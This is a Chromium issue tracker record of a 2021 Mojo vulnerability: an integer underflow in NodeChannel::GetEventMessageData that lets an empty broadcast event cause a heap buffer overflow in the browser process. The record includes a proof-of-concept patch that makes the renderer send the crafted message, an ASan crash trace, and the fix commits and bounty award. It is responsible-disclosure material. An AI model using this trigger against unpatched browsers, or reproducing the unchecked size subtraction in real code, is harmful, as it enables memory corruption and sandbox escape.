# Security: Integer Overflow leads to heap buffer overflow in the function 

| Field | Value |
|-------|-------|
| **Issue ID** | [40055420](https://issues.chromium.org/issues/40055420) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Mojo>Core |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | hi...@gmail.com |
| **Assignee** | ro...@google.com |
| **Created** | 2021-04-02 |
| **Bounty** | $20,000.00 |

## Description

Note the comment in the function GetEventMessageData
NodeChannel::GetEventMessageData

void NodeChannel::GetEventMessageData(Channel::Message* message,
                                      void** data,
                                      size_t* num_data_bytes) {
  // NOTE: OnChannelMessage guarantees that we never accept a Channel::Message
  // with a payload of fewer than |sizeof(Header)| bytes.
  *data = reinterpret_cast<Header*>(message->mutable_payload()) + 1;
  *num_data_bytes = message->payload_size() - sizeof(Header);
}

The comment says, "we never accept a Channel::Message with a payload of fewer than |sizeof(Header)| bytes", but it's wrong,
a BROADCAST_EVENT may contain payload with 0 size, which makes |message->payload_size() - sizeof(Header)| overflow, and |*num_data_bytes|
becomes a large value and cause heap buffer overflow in the following function

ScopedEvent Event::Deserialize(const void* buffer, size_t num_bytes) {
  if (num_bytes < sizeof(SerializedHeader))
    return nullptr;

  const auto* header = static_cast<const SerializedHeader*>(buffer);
  const PortName& port_name = header->port_name;
  const size_t data_size = num_bytes - sizeof(*header);
  switch (header->type) {  ##################################buffer overflow access start from here
    case Type::kUserMessage:
      return UserMessageEvent::Deserialize(port_name, header + 1, data_size);
    case Type::kPortAccepted:
      return PortAcceptedEvent::Deserialize(port_name, header + 1, data_size);
    case Type::kObserveProxy:
      return ObserveProxyEvent::Deserialize(port_name, header + 1, data_size);
    case Type::kObserveProxyAck:
      return ObserveProxyAckEvent::Deserialize(port_name, header + 1,
                                               data_size);
    case Type::kObserveClosure:
      return ObserveClosureEvent::Deserialize(port_name, header + 1, data_size);
    case Type::kMergePort:
      return MergePortEvent::Deserialize(port_name, header + 1, data_size);
    case Type::kUserMessageReadAckRequest:
      return UserMessageReadAckRequestEvent::Deserialize(port_name, header + 1,
                                                         data_size);
    case Type::kUserMessageReadAck:
      return UserMessageReadAckEvent::Deserialize(port_name, header + 1,
                                                  data_size);
    default:
      DVLOG(2) << "Ingoring unknown port event type: "
               << static_cast<uint32_t>(header->type);
      return nullptr;
  }
}

To reproduce the issue, please patch chrome through the following patch

```
diff --git a/mojo/core/node_channel.cc b/mojo/core/node_channel.cc
index c48fb573fea9..7ce197a579f5 100644
--- a/mojo/core/node_channel.cc
+++ b/mojo/core/node_channel.cc
@@ -17,7 +17,7 @@
 #include "mojo/core/configuration.h"
 #include "mojo/core/core.h"
 #include "mojo/core/request_context.h"
-
+#include "base/trace_event/trace_event.h"
 namespace mojo {
 namespace core {
 
@@ -327,12 +327,23 @@ void NodeChannel::AcceptInvitee(const ports::NodeName& inviter_name,
 
 void NodeChannel::AcceptInvitation(const ports::NodeName& token,
                                    const ports::NodeName& invitee_name) {
-  AcceptInvitationData* data;
-  Channel::MessagePtr message = CreateMessage(
-      MessageType::ACCEPT_INVITATION, sizeof(AcceptInvitationData), 0, &data);
-  data->token = token;
-  data->invitee_name = invitee_name;
-  WriteChannelMessage(std::move(message));
+  if (base::trace_event::TraceLog::GetInstance()->process_name() ==
+      "Renderer") {
+    void* data;
+    Channel::MessagePtr broadcast_message =
+        CreateMessage(MessageType::BROADCAST_EVENT, 16, 0, &data);
+    uint32_t buffer[] = {16, 16 + 0x10000, 0, 0};
+    memcpy(data, buffer, sizeof(buffer));
+    WriteChannelMessage(std::move(broadcast_message));
+  } else {
+    AcceptInvitationData* data;
+    Channel::MessagePtr message = CreateMessage(
+        MessageType::ACCEPT_INVITATION, sizeof(AcceptInvitationData), 0,
+        &data);
+    data->token = token;
+    data->invitee_name = invitee_name;
+    WriteChannelMessage(std::move(message));
+  }
 }
 
 void NodeChannel::AcceptPeer(const ports::NodeName& sender_name,
```


build chrome with asan, run chrome and the following asan report will show

dddd@ubuntu:$ ./chrome-wrapper  --user-data-dir=./tmp 
[2863801:2863801:0402/161532.409329:ERROR:sandbox_linux.cc(374)] InitializeSandbox() called with multiple threads in process gpu-process.
=================================================================
==2863721==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000293848 at pc 0x7f9cb4d5c6e9 bp 0x7f9ca5302740 sp 0x7f9ca5302738
READ of size 4 at 0x602000293848 thread T8 (Chrome_IOThread)
    #0 0x7f9cb4d5c6e8  (/chromium/src/out/Asan/libmojo_core_ports.so+0xc6e8)
    #1 0x7f9cb4def28c  (/chromium/src/out/Asan/libmojo_core_embedder_internal.so+0x6a28c)
    #2 0x7f9cb4e034b2  (/chromium/src/out/Asan/libmojo_core_embedder_internal.so+0x7e4b2)
    #3 0x7f9cb4deddd6  (/chromium/src/out/Asan/libmojo_core_embedder_internal.so+0x68dd6)
    #4 0x7f9cb4db8bb3  (/chromium/src/out/Asan/libmojo_core_embedder_internal.so+0x33bb3)
    #5 0x7f9cb4db82c2  (/chromium/src/out/Asan/libmojo_core_embedder_internal.so+0x332c2)
    #6 0x7f9cb4e37845  (/chromium/src/out/Asan/libmojo_core_embedder_internal.so+0xb2845)
    #7 0x7f9cf861ca6f  (/chromium/src/out/Asan/libbase.so+0x5a3a6f)
    #8 0x7f9cf86bdf9c  (/chromium/src/out/Asan/libbase.so+0x644f9c)
    #9 0x7f9cf861d68f  (/chromium/src/out/Asan/libbase.so+0x5a468f)
    #10 0x7f9cf84b0db6  (/chromium/src/out/Asan/libbase.so+0x437db6)
    #11 0x7f9cf83d1260  (/chromium/src/out/Asan/libbase.so+0x358260)
    #12 0x7f9cedca3b55  (/chromium/src/out/Asan/libcontent.so+0x2e95b55)
    #13 0x7f9cf8519f12  (/chromium/src/out/Asan/libbase.so+0x4a0f12)
    #14 0x7f9cf85baf65  (/chromium/src/out/Asan/libbase.so+0x541f65)
    #15 0x7f9cba392608  (/lib/x86_64-linux-gnu/libpthread.so.0+0x9608)

0x602000293848 is located 8 bytes to the right of 16-byte region [0x602000293830,0x602000293840)
allocated by thread T8 (Chrome_IOThread) here:
    #0 0x564fa46c47d7  (/chromium/src/out/Asan/chrome+0x31da7d7)
    #1 0x7f9cf831995a  (/chromium/src/out/Asan/libbase.so+0x2a095a)
    #2 0x7f9cb4db5541  (/chromium/src/out/Asan/libmojo_core_embedder_internal.so+0x30541)
    #3 0x7f9cb4ded12d  (/chromium/src/out/Asan/libmojo_core_embedder_internal.so+0x6812d)
    #4 0x7f9cb4db8bb3  (/chromium/src/out/Asan/libmojo_core_embedder_internal.so+0x33bb3)
    #5 0x7f9cb4db82c2  (/chromium/src/out/Asan/libmojo_core_embedder_internal.so+0x332c2)
    #6 0x7f9cb4e37845  (/chromium/src/out/Asan/libmojo_core_embedder_internal.so+0xb2845)
    #7 0x7f9cf861ca6f  (/chromium/src/out/Asan/libbase.so+0x5a3a6f)
    #8 0x7f9cf86bdf9c  (/chromium/src/out/Asan/libbase.so+0x644f9c)
    #9 0x7f9cf861d68f  (/chromium/src/out/Asan/libbase.so+0x5a468f)
    #10 0x7f9cf84b0db6  (/chromium/src/out/Asan/libbase.so+0x437db6)
    #11 0x7f9cf83d1260  (/chromium/src/out/Asan/libbase.so+0x358260)
    #12 0x7f9cedca3b55  (/chromium/src/out/Asan/libcontent.so+0x2e95b55)
    #13 0x7f9cf8519f12  (/chromium/src/out/Asan/libbase.so+0x4a0f12)
    #14 0x7f9cf85baf65  (/chromium/src/out/Asan/libbase.so+0x541f65)
    #15 0x7f9cba392608  (/lib/x86_64-linux-gnu/libpthread.so.0+0x9608)

Thread T8 (Chrome_IOThread) created by T0 (chrome) here:
    #0 0x564fa46ae0ca  (/chromium/src/out/Asan/chrome+0x31c40ca)
    #1 0x7f9cf85ba1ee  (/chromium/src/out/Asan/libbase.so+0x5411ee)
    #2 0x7f9cf85186e1  (/chromium/src/out/Asan/libbase.so+0x49f6e1)
    #3 0x7f9ceeb85819  (/chromium/src/out/Asan/libcontent.so+0x3d77819)
    #4 0x7f9cefdf2777  (/chromium/src/out/Asan/libcontent.so+0x4fe4777)
    #5 0x7f9cefdf2042  (/chromium/src/out/Asan/libcontent.so+0x4fe4042)
    #6 0x7f9cefdebc6e  (/chromium/src/out/Asan/libcontent.so+0x4fddc6e)
    #7 0x7f9cefdec26c  (/chromium/src/out/Asan/libcontent.so+0x4fde26c)
    #8 0x564fa46f1277  (/chromium/src/out/Asan/chrome+0x3207277)
    #9 0x7f9cb993f0b2  (/lib/x86_64-linux-gnu/libc.so.6+0x270b2)

SUMMARY: AddressSanitizer: heap-buffer-overflow (/chromium/src/out/Asan/libmojo_core_ports.so+0xc6e8) 
Shadow bytes around the buggy address:
  0x0c048004a6b0: fa fa 00 fa fa fa 00 00 fa fa 00 00 fa fa 00 00
  0x0c048004a6c0: fa fa 00 00 fa fa 00 fa fa fa 00 fa fa fa fc fc
  0x0c048004a6d0: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd
  0x0c048004a6e0: fa fa fd fd fa fa 00 fa fa fa 00 fa fa fa fd fd
  0x0c048004a6f0: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd
=>0x0c048004a700: fa fa fd fd fa fa 00 00 fa[fa]fa fa fa fa fa fa
  0x0c048004a710: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c048004a720: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c048004a730: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c048004a740: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c048004a750: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==2863721==ABORTING
Segmentation fault

The patch only apply to renderer process and the browser process is crash, this is a sandbox escape vulnerability.

## Timeline

### [Deleted User] (2021-04-02)

[Empty comment from Monorail migration]

### dr...@chromium.org (2021-04-05)

Thanks for the report! I can confirm the patch works as described. I'll have to defer to a Mojo owner for whether a compromised renderer could really send such a message, but I've triaged assuming it's possible.

dcheng@, oksamyt@ - can you take a look?

[Monorail components: Internals>Mojo>Core]

### [Deleted User] (2021-04-06)

Setting milestone and target because of Security_Impact=Stable and high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### dc...@chromium.org (2021-04-06)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2021-04-07)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/6740adb28374ddeee13febfd5e5d20cb8a365979

commit 6740adb28374ddeee13febfd5e5d20cb8a365979
Author: Ken Rockot <rockot@google.com>
Date: Wed Apr 07 22:18:36 2021

Mojo: Properly validate broadcast events

This corrects broadcast event deserialization by adding a missing
validation step when decoding the outer message header.

Fixed: 1195308
Change-Id: Ia67a20e48614e7ef00b1b32f7f4e5f20235be310
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2808678
Reviewed-by: Daniel Cheng <dcheng@chromium.org>
Commit-Queue: Ken Rockot <rockot@google.com>
Cr-Commit-Position: refs/heads/master@{#870238}

[modify] https://crrev.com/6740adb28374ddeee13febfd5e5d20cb8a365979/mojo/core/node_channel.cc
[modify] https://crrev.com/6740adb28374ddeee13febfd5e5d20cb8a365979/mojo/core/node_channel.h
[modify] https://crrev.com/6740adb28374ddeee13febfd5e5d20cb8a365979/mojo/core/node_controller.cc
[modify] https://crrev.com/6740adb28374ddeee13febfd5e5d20cb8a365979/mojo/core/user_message_impl.cc


### [Deleted User] (2021-04-08)

[Empty comment from Monorail migration]

### [Deleted User] (2021-04-08)

[Empty comment from Monorail migration]

### [Deleted User] (2021-04-08)

Requesting merge to stable M89 because latest trunk commit (870238) appears to be after stable branch point (843830).

Requesting merge to beta M90 because latest trunk commit (870238) appears to be after beta branch point (857950).

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2021-04-08)

This bug requires manual review: We are only 4 days from stable.
Before a merge request will be considered, the following information is required to be added to this bug:

1. Does your merge fit within the Merge Decision Guidelines?
- Chrome: https://chromium.googlesource.com/chromium/src.git/+/master/docs/process/merge_request.md#when-to-request-a-merge
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. Links to the CLs you are requesting to merge.
3. Has the change landed and been verified on ToT?
4. Does this change need to be merged into other active release branches (M-1, M+1)?
5. Why are these changes required in this milestone after branch?
6. Is this a new feature?
7. If it is a new feature, is it behind a flag using finch?

Chrome OS Only:
8. Was the change reviewed and approved by the Eng Prod Representative? See Eng Prod ownership by component: http://go/cros-engprodcomponents

Please contact the milestone owner if you have questions.
Owners: govind@(Android), bindusuvarna@(iOS), cindyb@(ChromeOS), srinivassista@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ad...@google.com (2021-04-15)

Approving merge to M90, branch 4430.

### [Deleted User] (2021-04-15)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2021-04-15)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/1536a564d9591d275750552340d2ec5c6d24c4a4

commit 1536a564d9591d275750552340d2ec5c6d24c4a4
Author: Ken Rockot <rockot@google.com>
Date: Thu Apr 15 18:14:57 2021

Mojo: Properly validate broadcast events

This corrects broadcast event deserialization by adding a missing
validation step when decoding the outer message header.

(cherry picked from commit 6740adb28374ddeee13febfd5e5d20cb8a365979)

Fixed: 1195308
Change-Id: Ia67a20e48614e7ef00b1b32f7f4e5f20235be310
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2808678
Reviewed-by: Daniel Cheng <dcheng@chromium.org>
Commit-Queue: Ken Rockot <rockot@google.com>
Cr-Original-Commit-Position: refs/heads/master@{#870238}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2827760
Commit-Queue: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
Auto-Submit: Ken Rockot <rockot@google.com>
Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
Cr-Commit-Position: refs/branch-heads/4430@{#1290}
Cr-Branched-From: e5ce7dc4f7518237b3d9bb93cccca35d25216cbe-refs/heads/master@{#857950}

[modify] https://crrev.com/1536a564d9591d275750552340d2ec5c6d24c4a4/mojo/core/node_channel.cc
[modify] https://crrev.com/1536a564d9591d275750552340d2ec5c6d24c4a4/mojo/core/node_channel.h
[modify] https://crrev.com/1536a564d9591d275750552340d2ec5c6d24c4a4/mojo/core/node_controller.cc
[modify] https://crrev.com/1536a564d9591d275750552340d2ec5c6d24c4a4/mojo/core/user_message_impl.cc


### ad...@google.com (2021-04-19)

[Empty comment from Monorail migration]

### ad...@google.com (2021-04-19)

[Empty comment from Monorail migration]

### ac...@chromium.org (2021-04-20)

[Empty comment from Monorail migration]

### gi...@google.com (2021-04-20)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2021-04-20)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/406ae3e8a9a8a09ccb9b4e33f2aa7cdbdd29af0c

commit 406ae3e8a9a8a09ccb9b4e33f2aa7cdbdd29af0c
Author: Ken Rockot <rockot@google.com>
Date: Tue Apr 20 15:46:33 2021

M86-LTS: Mojo: Properly validate broadcast events

This corrects broadcast event deserialization by adding a missing
validation step when decoding the outer message header.

(cherry picked from commit 6740adb28374ddeee13febfd5e5d20cb8a365979)

Fixed: 1195308
Change-Id: Ia67a20e48614e7ef00b1b32f7f4e5f20235be310
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2808678
Reviewed-by: Daniel Cheng <dcheng@chromium.org>
Commit-Queue: Ken Rockot <rockot@google.com>
Cr-Original-Commit-Position: refs/heads/master@{#870238}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2837712
Owners-Override: Achuith Bhandarkar <achuith@chromium.org>
Auto-Submit: Achuith Bhandarkar <achuith@chromium.org>
Reviewed-by: Artem Sumaneev <asumaneev@google.com>
Commit-Queue: Achuith Bhandarkar <achuith@chromium.org>
Cr-Commit-Position: refs/branch-heads/4240@{#1614}
Cr-Branched-From: f297677702651916bbf65e59c0d4bbd4ce57d1ee-refs/heads/master@{#800218}

[modify] https://crrev.com/406ae3e8a9a8a09ccb9b4e33f2aa7cdbdd29af0c/mojo/core/node_channel.cc
[modify] https://crrev.com/406ae3e8a9a8a09ccb9b4e33f2aa7cdbdd29af0c/mojo/core/node_channel.h
[modify] https://crrev.com/406ae3e8a9a8a09ccb9b4e33f2aa7cdbdd29af0c/mojo/core/node_controller.cc
[modify] https://crrev.com/406ae3e8a9a8a09ccb9b4e33f2aa7cdbdd29af0c/mojo/core/user_message_impl.cc


### ad...@google.com (2021-04-20)

[Empty comment from Monorail migration]

### as...@google.com (2021-04-21)

[Empty comment from Monorail migration]

### am...@google.com (2021-04-22)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2021-04-23)

Congratulations, higongguang@! And another one - the VRP Panel has decided to award you $20,000 for this one. Excellent work on these reports!

### am...@google.com (2021-04-26)

[Empty comment from Monorail migration]

### am...@google.com (2021-04-26)

[Empty comment from Monorail migration]

### [Deleted User] (2021-07-28)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1195308?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40055420)*
